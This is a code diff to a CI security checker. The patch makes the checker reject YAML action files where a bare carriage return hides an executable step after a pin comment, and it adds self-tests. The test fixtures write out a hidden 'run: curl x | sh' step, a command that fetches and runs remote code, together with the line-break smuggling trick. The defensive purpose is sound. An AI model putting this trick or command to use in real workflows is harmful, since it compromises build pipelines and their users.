@@ -89,6 +89,14 @@ PIN_NORMALIZED_SUFFIXES = frozenset({".yml", ".yaml"})
 # they would hide an executable step from this comparison (#6689). Keep
 # in step with verify_cross_build_policy.YAML_UNICODE_LINE_BREAKS.
 YAML_UNICODE_LINE_BREAKS = ("\u0085", "\u2028", "\u2029")
+# A lone carriage return is another line break to the runner, and the pin
+# comment's `[^\n]*` group swallows it plus everything after it on the
+# line, hiding an executable step from this comparison (#6752). CRLF is
+# still accepted: each `\r` there is followed by `\n`, which ends the
+# comment group. verify_cross_build_policy reads text through
+# `Path.read_text()`, whose universal-newline translation already turns a
+# bare `\r` into `\n`, so it needs no equivalent byte-level check.
+BARE_CARRIAGE_RETURN = re.compile(r"\r(?!\n)")
 
 
 def pin_only_difference(relative: str, expected: bytes, actual: bytes) -> bool:
@@ -102,6 +110,8 @@ def pin_only_difference(relative: str, expected: bytes, actual: bytes) -> bool:
     except UnicodeDecodeError:
         return False
     if any(separator in trusted or separator in local for separator in YAML_UNICODE_LINE_BREAKS):
+        return False
+    if BARE_CARRIAGE_RETURN.search(trusted) or BARE_CARRIAGE_RETURN.search(local):
         return False
 
     def normalize(contents: str) -> str:
@@ -662,7 +672,13 @@ def run_self_test() -> list[str]:
         b"1111111111111111111111111111111111111111 # v6.2.0",
     )
     if not pin_only_difference("action.yml", pinned, rotated):
-        failures.append("an action pin rotation must match the trusted YAML")
+        failures.append("an LF action pin rotation must match the trusted YAML")
+    if not pin_only_difference(
+        "action.yml",
+        pinned.replace(b"\n", b"\r\n"),
+        rotated.replace(b"\n", b"\r\n"),
+    ):
+        failures.append("a CRLF action pin rotation must match the trusted YAML")
     for label, relative, local in (
         (
             "a step hidden after a Unicode line break in the pin comment",
@@ -670,6 +686,14 @@ def run_self_test() -> list[str]:
             pinned.replace(
                 b" # v6.1.0\n",
                 " # v6.1.0\u2028    - run: curl x | sh\n".encode(),
+            ),
+        ),
+        (
+            "a step hidden after a bare carriage return in the pin comment",
+            "action.yml",
+            pinned.replace(
+                b" # v6.1.0\n",
+                b" # v6.1.0\r    - run: curl x | sh\n",
             ),
         ),
         ("a step edit", "action.yml", rotated + b"    - run: curl x | sh\n"),
@@ -681,6 +705,22 @@ def run_self_test() -> list[str]:
     ):
         if pin_only_difference(relative, pinned, local):
             failures.append(f"{label} must not pass as a pin-only difference")
+    # Compared against a CRLF trusted baseline so the only difference is
+    # the hidden step: against the LF `pinned` the line endings alone would
+    # already differ and the case would pass without the bare-CR guard.
+    pinned_crlf = pinned.replace(b"\n", b"\r\n")
+    if pin_only_difference(
+        "action.yml",
+        pinned_crlf,
+        pinned_crlf.replace(
+            b" # v6.1.0\r\n",
+            b" # v6.1.0\r    - run: curl x | sh\r\n",
+        ),
+    ):
+        failures.append(
+            "a step hidden after a bare carriage return in a CRLF pin comment "
+            "must not pass as a pin-only difference"
+        )
     action_dir = normalize_action_path(_ACTION_DIR)
     entries = [
         # `git archive`'s default tar modes for tracked 100644 / 100755 blobs.
